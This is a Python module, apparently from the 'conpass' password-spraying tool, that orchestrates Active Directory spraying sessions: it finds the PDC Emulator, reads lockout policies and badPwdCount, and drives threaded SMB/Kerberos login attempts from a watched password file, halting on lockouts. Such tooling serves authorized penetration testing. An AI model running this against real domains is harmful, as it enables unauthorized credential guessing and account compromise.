"""Run a spraying session: locate the PDC, load the targets, then feed the workers."""

import threading
import time
from datetime import datetime, timezone

from rich.progress import BarColumn, MofNCompleteColumn, Progress, TaskProgressColumn, TextColumn
from rich.prompt import Confirm

from conpass.config import SprayConfig
from conpass.database import Database
from conpass.errors import ConfigurationError, ConnectionFailedError
from conpass.output import console, debug, success, warning
from conpass.protocols.dns import DnsResolver
from conpass.protocols.kerberos import KerberosChecker
from conpass.protocols.ldap import LdapClient
from conpass.protocols.smb import SmbAuthenticator, get_server_time
from conpass.report import print_bad_password_counts, print_policies
from conpass.scheduler import Scheduler
from conpass.targets import Targets, load_from_file, load_from_ldap, read_lines
from conpass.timeutils import dc_now
from conpass.worker import SprayContext, Worker

# How often the password file is read again, in seconds
PASSWORD_FILE_POLL_INTERVAL = 1.0
# How long workers get to finish their current attempt when stopping, in seconds
WORKER_STOP_TIMEOUT = 5.0


class Orchestrator:
    """A spraying session."""

    def __init__(self, config: SprayConfig):
        self.config = config
        # A DC is almost always a DNS server of its domain, while the system
        # resolver often cannot resolve the domain names needed to find the PDC
        self.resolver = DnsResolver(config.dns_ip or config.dc_ip, config.timeout)
        self.database = Database(config.database_path, config.domain) if config.database_path else None
        self.pdc_ip = ""
        self.ldap: LdapClient | None = None
        self.time_delta = None
        self.targets: Targets | None = None

    def run(self) -> None:
        """
        Gather information, then spray unless disabled.

        Raises:
            ConpassError: If the session cannot start
        """
        console.rule("Important information")
        warning("conpass does its best to find the effective password policy but may be wrong. Use with caution.")
        console.print("[yellow]Emergency command:[/yellow] [red]Search-ADAccount -LockedOut | Unlock-ADAccount[/red]")
        try:
            self._gather_information()
            if self.config.spray:
                self._spray()
            else:
                warning("Spraying disabled: no password file, no --user-as-pass, or --disable-spray")
        finally:
            if self.ldap:
                self.ldap.close()
            if self.database:
                self.database.close()

    # ----- information gathering -----

    def _gather_information(self) -> None:
        console.rule("Gathering information")
        if self.database:
            total, valid = self.database.stats()
            console.print(f"[cyan]Database: {total} tests recorded, {valid} valid credential(s)[/cyan]")

        if self.config.online:
            self._connect_to_pdc()
            self.targets = load_from_ldap(self.ldap, self.config)
        else:
            warning("Offline mode: the policy given on the command line is trusted, no lockout state is read")
            self.pdc_ip = self._locate_pdc()
            self.targets = load_from_file(self.config)

        self._measure_time_delta()
        print_policies(self.targets)
        self._skip_found_users()
        print_bad_password_counts(self.targets.users, dc_now(self.time_delta))
        success(f"Users to spray: {len(self.targets.users)}")

    def _initial_dc(self) -> str:
        """DC given on the command line, or the address of the domain name."""
        if self.config.dc_ip:
            return self.config.dc_ip
        dc_ip = self.resolver.resolve(self.config.domain)
        if not dc_ip:
            msg = f"Could not resolve {self.config.domain}: use --dc-ip or --dns-ip"
            raise ConfigurationError(msg)
        return dc_ip

    def _new_ldap_client(self, host: str, schemes: tuple[str, ...] | None = None) -> LdapClient:
        if schemes is None:
            schemes = ("ldaps",) if self.config.use_ldaps else ("ldap", "ldaps")
        return LdapClient(host, self.config.domain, self.config.credentials, schemes, self.config.timeout)

    def _connect_to_pdc(self) -> None:
        """Connect over LDAP to any DC, find the PDC Emulator there, then connect to it."""
        dc_ip = self._initial_dc()
        self.ldap = self._new_ldap_client(dc_ip)
        self.ldap.connect()
        self.pdc_ip = self._locate_pdc()
        if self.pdc_ip != dc_ip:
            self.ldap.close()
            self.ldap = self._new_ldap_client(self.pdc_ip)
            self.ldap.connect()
        success(f"Connected to the PDC Emulator ({self.pdc_ip}) over {self.ldap.scheme.upper()}")

    def _locate_pdc(self) -> str:
        """
        IP of the PDC Emulator.

        badPwdCount is not replicated: only the PDC sees every failure and decides
        the lockout. Authenticating directly against it means our attempts only
        move the counter we read, and bypasses the cases where a DC does not
        forward failures to the PDC (AvoidPdcOnWan, negative cache).
        """
        hostname = self.ldap.find_pdc_hostname() if self.ldap else None
        hostname = hostname or self.resolver.find_pdc(self.config.domain)
        pdc_ip = self.resolver.resolve(hostname) if hostname else None
        if pdc_ip:
            success(f"PDC Emulator: {hostname} ({pdc_ip})")
            return pdc_ip

        fallback = self._initial_dc()
        warning(
            f"Could not locate the PDC Emulator (found: {hostname or 'nothing'}), falling back to {fallback}. "
            "If it is not the PDC, failures may also be counted where they are never read, "
            "which increases the lockout risk."
        )
        if not Confirm.ask("Continue anyway?", console=console, default=False):
            msg = "Aborted: PDC Emulator not found, use --dns-ip or --dc-ip to point to it"
            raise ConfigurationError(msg)
        return fallback

    def _measure_time_delta(self) -> None:
        """badPasswordTime and lockoutTime are written with the PDC clock: compute on that clock."""
        pdc_time = get_server_time(self.pdc_ip, self.config.timeout)
        self.time_delta = datetime.now(timezone.utc) - pdc_time
        console.print(f"Local clock minus PDC clock: {self.time_delta.total_seconds():.3f} seconds")

    def _skip_found_users(self) -> None:
        """Do not spray users whose password was found in a previous session."""
        if not self.database:
            return
        found = {username.lower() for username, _, _ in self.database.found_credentials()}
        users = [user for user in self.targets.users if user.samaccountname.lower() not in found]
        skipped = len(self.targets.users) - len(users)
        if skipped:
            success(f"{skipped} user(s) skipped: password already found (conpass --show to display them)")
        self.targets.users = users

    # ----- spraying -----

    def _spray(self) -> None:
        console.rule("Password spraying")
        is_tested = None
        if self.database:
            database = self.database
            is_tested = lambda user, password: database.is_tested(user.samaccountname, password)  # noqa: E731
        scheduler = Scheduler(self.targets.users, is_tested)
        context = SprayContext(
            scheduler=scheduler,
            time_delta=self.time_delta,
            stop_event=threading.Event(),
            lockout_event=threading.Event(),
            kerberos=KerberosChecker(self.pdc_ip, self.config.domain, self.time_delta, self.config.timeout),
            database=self.database,
            connect_ldap=self._connect_ldap_by_name if self.config.online else None,
        )
        workers = self._start_workers(context)
        try:
            if workers:
                self._feed(context, workers)
        except KeyboardInterrupt:
            warning("Interrupted, waiting for running attempts to finish...")
        finally:
            scheduler.close()
            context.stop_event.set()
            for worker in workers:
                worker.join(WORKER_STOP_TIMEOUT)
        if context.lockout_event.is_set():
            console.print("[red bold]Spraying aborted: an account lockout was detected[/red bold]")

    def _connect_ldap_by_name(self, hostname: str) -> LdapClient:
        return self._new_ldap_client(self.resolver.resolve(hostname) or hostname, (self.ldap.scheme,))

    def _start_workers(self, context: SprayContext) -> list[Worker]:
        """Start the workers, each with its own LDAP and SMB connections to the PDC."""
        ready = threading.Semaphore(0)
        results: list[bool] = []

        def on_ready(connected: bool) -> None:
            results.append(connected)
            ready.release()

        workers = []
        for worker_id in range(1, self.config.threads + 1):
            ldap = self._new_ldap_client(self.pdc_ip, (self.ldap.scheme,)) if self.ldap else None
            smb = SmbAuthenticator(self.pdc_ip, self.config.domain, self.config.timeout)
            worker = Worker(worker_id, context, ldap, smb, on_ready)
            worker.start()
            workers.append(worker)

        with console.status("Connecting workers..."):
            for _ in workers:
                ready.acquire()
        connected = sum(results)
        if not connected:
            msg = "No worker could connect to the PDC"
            raise ConnectionFailedError(msg)
        success(f"{connected}/{len(workers)} workers connected")
        return workers

    def _feed(self, context: SprayContext, workers: list[Worker]) -> None:
        """Feed the scheduler with passwords, watching the password file, until everything is tested."""
        scheduler = context.scheduler
        if self.config.user_as_pass:
            for user in self.targets.users:
                scheduler.add_user_password(user, user.samaccountname)

        known: set[str] = set()
        last_read = 0.0
        idle_announced = False
        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TaskProgressColumn(),
            TextColumn("[bright_black]{task.fields[waiting]}"),
            console=console,
        ) as progress:
            task = progress.add_task("Spraying", total=0, waiting="")
            while not context.lockout_event.is_set() and any(worker.is_alive() for worker in workers):
                if self.config.password_file and time.monotonic() - last_read >= PASSWORD_FILE_POLL_INTERVAL:
                    last_read = time.monotonic()
                    if self._load_new_passwords(scheduler, known):
                        idle_announced = False

                completed, total = scheduler.progress()
                waiting = scheduler.waiting_count()
                progress.update(
                    task,
                    completed=completed,
                    total=total,
                    waiting=f"{waiting} user(s) waiting for their observation window" if waiting else "",
                )
                if scheduler.is_done():
                    if not self.config.password_file:
                        break
                    if not idle_announced:
                        idle_announced = True
                        success("All passwords tested. Watching the password file for new ones (Ctrl+C to quit)")
                time.sleep(0.5)

    def _load_new_passwords(self, scheduler: Scheduler, known: set[str]) -> bool:
        """Queue the passwords added to the password file since the last read."""
        try:
            passwords = [password for password in read_lines(self.config.password_file) if password not in known]
        except OSError as e:
            debug(f"Could not read the password file: {e}")
            return False
        if not passwords:
            return False
        known.update(passwords)
        scheduler.add_passwords(passwords)
        console.print(f"[cyan]{len(passwords)} new password(s) queued[/cyan]")
        return True
